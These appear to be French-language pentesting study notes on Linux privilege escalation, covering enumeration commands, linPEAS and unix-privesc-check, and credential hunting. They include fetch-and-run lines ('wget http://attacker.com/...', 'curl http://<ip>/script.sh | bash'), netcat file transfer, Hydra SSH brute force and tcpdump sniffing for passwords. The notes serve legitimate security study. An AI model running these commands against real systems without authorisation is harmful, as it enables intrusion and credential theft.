# Linux

## OLD
### Stratégie

* Version de Linux -> exploit ?
* Historique utilisateur, bashrc, bash history, variable ENV
* Cron qui tournent avec des scripts sur lesquels on a des droits en écriture
* Recherche d'exploits avec des binaires : GTFOBins
* `sudo -l` pour voir ce que tu peux exec en root -> GTFOBins
* `find / -perm -u=s -type f 2>/dev/null` -> GTFOBins

### Outils

* [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
* [GTFOBins](https://gtfobins.github.io/)

### Commandes

```bash
# linpeas.sh
wget http://attacker.com/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

id
sudo -l
crontab -l
env
find / -perm -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null
getcap -r / 2>/dev/null
ps aux
ss -tln
netstat -taupen

# regarder les binaires liés à un group
find / -group bugtracker 2>/dev/null

# infos sur un fichier (looking for setuid, suid)
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

# Exécuter un script Bash
cat script.sh | bash
curl http://<ip>/script.sh | bash
```

## Enumerating Linux

### Enumération manuelle

**Utilisateur courant**

```bash
id
```

**Tous les utilisateurs**

```bash
cat /etc/passwd
```

Format : `login:x:UID:GID:commentaire:home:shell`. Le `x` signifie que le hash est dans `/etc/shadow`. Les comptes de service ont `/usr/sbin/nologin` comme shell.

**Hostname**

```bash
hostname
```

**Version OS et kernel**

```bash
cat /etc/issue
cat /etc/os-release
uname -a
```

**Processus en cours d'exécution**

```bash
ps aux
```

**Interfaces réseau**

```bash
ip a
```

**Table de routage**

```bash
routel
# ou
route
```

**Connexions réseau actives**

```bash
ss -anp
```

**Règles firewall**

Nécessite root pour `iptables`, mais les fichiers de config sont souvent lisibles :

```bash
cat /etc/iptables/rules.v4
```

Chercher aussi les fichiers générés par `iptables-save` :

```bash
grep -r "iptables" /etc/ 2>/dev/null
```

**Tâches planifiées (cron)**

```bash
ls -lah /etc/cron*
crontab -l
sudo crontab -l
```

**Applications installées**

```bash
# Debian/Ubuntu
dpkg -l

# Red Hat/CentOS
rpm -qa
```

**Répertoires accessibles en écriture**

```bash
find / -writable -type d 2>/dev/null
```

**Systèmes de fichiers montés et partitions**

```bash
cat /etc/fstab
mount
lsblk
```

**Modules kernel chargés**

```bash
lsmod
/sbin/modinfo <module>
```

**Binaires avec bit SUID**

Si le SUID est positionné sur un binaire appartenant à root, n'importe quel utilisateur peut l'exécuter avec les droits root.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Référence pour l'exploitation : [GTFOBins](https://gtfobins.github.io/), [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md), [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).

```bash
# Extraire le contenu lisible d'un binaire
strings /usr/bin/passwd_flag
```

### Enumération automatique

#### Transfert de fichiers avec nc

```bash
# On your receiver:

nc -l -p 1234 -q 1 > something.zip < /dev/null

# On your sender:

cat something.zip | netcat server.ip.here 1234

```

#### unix-privesc-check

Pré-installé sur Kali dans `/usr/bin/unix-privesc-check`. Transférer sur la cible et rediriger l'output dans un fichier.

```bash
# Standard : rapide, peu de faux positifs
./unix-privesc-check standard > output.txt

# Detailed : vérifie aussi les file handles ouverts et les fichiers appelés par les scripts
./unix-privesc-check detailed > output.txt
```

Chercher les lignes `WARNING` dans l'output — elles indiquent des misconfigurations exploitables (ex: `/etc/passwd` world-writable).

#### linPEAS

```bash
# Kali : servir
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80
```

```bash
# Cible : télécharger et exécuter
curl http://<ip>/linpeas.sh | bash
# ou
wget http://<ip>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
./linpeas.sh > output.txt
```

## Exposed confidential information

### Inspecting user trails

**Variables d'environnement**

Parfois des credentials sont stockés dans des variables d'environnement (ex: scripts d'authentification custom).

```bash
env
```

**Fichiers de configuration shell**

Vérifier si une variable suspecte trouvée dans `env` est persistante (définie dans `.bashrc`, `.bash_profile`, etc.).

```bash
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.profile
```

**Escalade directe si credential trouvé**

```bash
su - root
# ou
su - <autre_user>
```

**Générer un wordlist dérivé d'un credential connu**

Si on connaît un pattern (ex: `Lab` + 3 chiffres) :

```bash
# Kali
crunch 6 6 -t Lab%%% > wordlist
```

**Brute force SSH avec Hydra**

```bash
# Kali
hydra -l <user> -P wordlist <ip> -t 4 ssh
```

**Vérifier les droits sudo une fois connecté**

```bash
sudo -l
sudo -i
```

### Inspecting service footprints

**Surveiller les processus en temps réel pour détecter des credentials**

Contrairement à Windows, on peut inspecter les processus des autres utilisateurs, y compris root.

```bash
watch -n 1 "ps -aux | grep pass"
```

**Sniffer le trafic loopback avec tcpdump**

Nécessite sudo ou les droits explicites sur tcpdump. Utile si des services internes échangent des credentials en clair sur localhost.

```bash
sudo tcpdump -i lo -A | grep "pass"
```

## Insecure file permissions

